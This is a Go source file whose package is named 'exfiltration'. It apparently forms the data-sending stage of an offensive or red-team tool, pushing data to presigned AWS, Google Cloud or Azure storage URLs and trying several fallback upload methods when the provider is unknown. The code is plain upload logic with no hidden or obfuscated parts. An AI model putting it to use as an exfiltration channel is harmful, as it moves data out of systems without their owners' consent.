package exfiltration

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"path/filepath"
	"strings"
	"time"
)

// CloudProvider represents different cloud storage providers
type CloudProvider int

const (
	UnknownProvider CloudProvider = iota
	AWSProvider
	GCPProvider
	AzureProvider
)

// UploadData uploads data to cloud storage using a presigned URL
func UploadData(presignedURL string, data []byte, fileName string) error {
	provider, err := detectCloudProvider(presignedURL)
	if err != nil {
		return fmt.Errorf("failed to detect cloud provider: %w", err)
	}

	fmt.Printf("🔍 Detected cloud provider: %s\n", getProviderName(provider))

	switch provider {
	case AWSProvider:
		return uploadToAWS(presignedURL, data, fileName)
	case GCPProvider:
		return uploadToGCP(presignedURL, data, fileName)
	case AzureProvider:
		return uploadToAzure(presignedURL, data, fileName)
	default:
		// Try generic upload as fallback
		return uploadGeneric(presignedURL, data, fileName)
	}
}

// detectCloudProvider detects the cloud provider based on the URL
func detectCloudProvider(presignedURL string) (CloudProvider, error) {
	parsedURL, err := url.Parse(presignedURL)
	if err != nil {
		return UnknownProvider, fmt.Errorf("invalid URL: %w", err)
	}

	host := strings.ToLower(parsedURL.Host)

	switch {
	case strings.Contains(host, "s3") && strings.Contains(host, "amazonaws.com"):
		return AWSProvider, nil
	case strings.Contains(host, "storage.googleapis.com") || strings.Contains(host, "storage.cloud.google.com"):
		return GCPProvider, nil
	case strings.Contains(host, "blob.core.windows.net"):
		return AzureProvider, nil
	default:
		return UnknownProvider, nil
	}
}

// getProviderName returns the human-readable name of the provider
func getProviderName(provider CloudProvider) string {
	switch provider {
	case AWSProvider:
		return "AWS S3"
	case GCPProvider:
		return "Google Cloud Storage"
	case AzureProvider:
		return "Azure Blob Storage"
	default:
		return "Unknown/Generic"
	}
}

// uploadToAWS uploads data to AWS S3 using a presigned URL
func uploadToAWS(presignedURL string, data []byte, fileName string) error {
	fmt.Println("📤 Uploading to AWS S3...")

	// For AWS S3, we typically use PUT requests with the data directly
	req, err := http.NewRequest("PUT", presignedURL, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	// Set appropriate headers
	req.Header.Set("Content-Type", getContentType(fileName))
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(data)))

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to upload to S3: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		fmt.Printf("✅ Successfully uploaded to AWS S3 (Status: %d)\n", resp.StatusCode)
		return nil
	}

	body, _ := io.ReadAll(resp.Body)
	return fmt.Errorf("S3 upload failed with status %d: %s", resp.StatusCode, string(body))
}

// uploadToGCP uploads data to Google Cloud Storage using a presigned URL
func uploadToGCP(presignedURL string, data []byte, fileName string) error {
	fmt.Println("📤 Uploading to Google Cloud Storage...")

	// GCP typically uses PUT requests for presigned URLs
	req, err := http.NewRequest("PUT", presignedURL, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Content-Type", getContentType(fileName))
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(data)))

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to upload to GCS: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		fmt.Printf("✅ Successfully uploaded to Google Cloud Storage (Status: %d)\n", resp.StatusCode)
		return nil
	}

	body, _ := io.ReadAll(resp.Body)
	return fmt.Errorf("GCS upload failed with status %d: %s", resp.StatusCode, string(body))
}

// uploadToAzure uploads data to Azure Blob Storage using a presigned URL
func uploadToAzure(presignedURL string, data []byte, fileName string) error {
	fmt.Println("📤 Uploading to Azure Blob Storage...")

	// Azure typically uses PUT requests for blob uploads
	req, err := http.NewRequest("PUT", presignedURL, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	req.Header.Set("Content-Type", getContentType(fileName))
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(data)))
	req.Header.Set("x-ms-blob-type", "BlockBlob")

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to upload to Azure: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		fmt.Printf("✅ Successfully uploaded to Azure Blob Storage (Status: %d)\n", resp.StatusCode)
		return nil
	}

	body, _ := io.ReadAll(resp.Body)
	return fmt.Errorf("Azure upload failed with status %d: %s", resp.StatusCode, string(body))
}

// uploadGeneric attempts a generic upload for unknown providers
func uploadGeneric(presignedURL string, data []byte, fileName string) error {
	fmt.Println("📤 Attempting generic upload...")

	// Try PUT first (most common for presigned URLs)
	if err := tryUploadMethod("PUT", presignedURL, data, fileName); err == nil {
		return nil
	}

	// Try POST with multipart form data
	if err := tryUploadMethodMultipart("POST", presignedURL, data, fileName); err == nil {
		return nil
	}

	// Try POST with direct data
	if err := tryUploadMethod("POST", presignedURL, data, fileName); err == nil {
		return nil
	}

	return fmt.Errorf("all upload methods failed for unknown provider")
}

// tryUploadMethod tries uploading with a specific HTTP method
func tryUploadMethod(method, presignedURL string, data []byte, fileName string) error {
	req, err := http.NewRequest(method, presignedURL, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("failed to create %s request: %w", method, err)
	}

	req.Header.Set("Content-Type", getContentType(fileName))
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(data)))

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to upload using %s: %w", method, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		fmt.Printf("✅ Successfully uploaded using %s (Status: %d)\n", method, resp.StatusCode)
		return nil
	}

	return fmt.Errorf("%s upload failed with status %d", method, resp.StatusCode)
}

// tryUploadMethodMultipart tries uploading with multipart form data
func tryUploadMethodMultipart(method, presignedURL string, data []byte, fileName string) error {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	// Create form file
	part, err := writer.CreateFormFile("file", fileName)
	if err != nil {
		return fmt.Errorf("failed to create form file: %w", err)
	}

	_, err = part.Write(data)
	if err != nil {
		return fmt.Errorf("failed to write data to form: %w", err)
	}

	err = writer.Close()
	if err != nil {
		return fmt.Errorf("failed to close multipart writer: %w", err)
	}

	req, err := http.NewRequest(method, presignedURL, &body)
	if err != nil {
		return fmt.Errorf("failed to create multipart %s request: %w", method, err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to upload using multipart %s: %w", method, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		fmt.Printf("✅ Successfully uploaded using multipart %s (Status: %d)\n", method, resp.StatusCode)
		return nil
	}

	return fmt.Errorf("multipart %s upload failed with status %d", method, resp.StatusCode)
}

// getContentType returns the appropriate content type based on file extension
func getContentType(fileName string) string {
	ext := strings.ToLower(filepath.Ext(fileName))

	switch ext {
	case ".json":
		return "application/json"
	case ".yaml", ".yml":
		return "application/x-yaml"
	case ".csv":
		return "text/csv"
	case ".txt":
		return "text/plain"
	case ".xml":
		return "application/xml"
	case ".zip":
		return "application/zip"
	case ".tar":
		return "application/x-tar"
	case ".gz":
		return "application/gzip"
	default:
		return "application/octet-stream"
	}
}
